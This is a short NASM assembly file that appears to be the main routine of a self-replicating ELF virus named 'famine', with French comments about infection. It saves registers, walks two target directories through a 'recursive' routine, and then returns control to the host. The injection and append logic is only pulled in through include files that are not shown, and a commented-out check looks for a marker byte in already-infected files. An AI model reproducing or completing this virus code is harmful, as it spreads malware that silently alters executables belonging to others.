%include "include.s"

 ;   lea r15, [rel jump + 1]
 ;   cmp byte [r15], 0x90                ; cette ligne permet de quiter le code une fois qu'il a été infecter
 ;   jnz close_mmap

section .text
    global main

main:
    enter famine_size, 0                 ; comstruit la stack et ajoute la structure famine dans la stack
    push rdx                             ; push les registre important pour pouvoir les rétablir une fois le virus executer
    push rcx
    push rdi
    push rsi
    lea rdi, [rsp + fileName]
    lea rsi, [rel firstDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive
    lea rdi, [rsp + fileName]
    lea rsi, [rel secondDir]
    call ft_strcpy
    mov rdi, rsp
    call recursive

exit:
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    leave

jump:
    ret
    nop
    nop
    nop
    nop


%include "recursive.s"

%include "injection.s"

%include "ft_memcpy.s"

%include "append.s"

%include "data.s"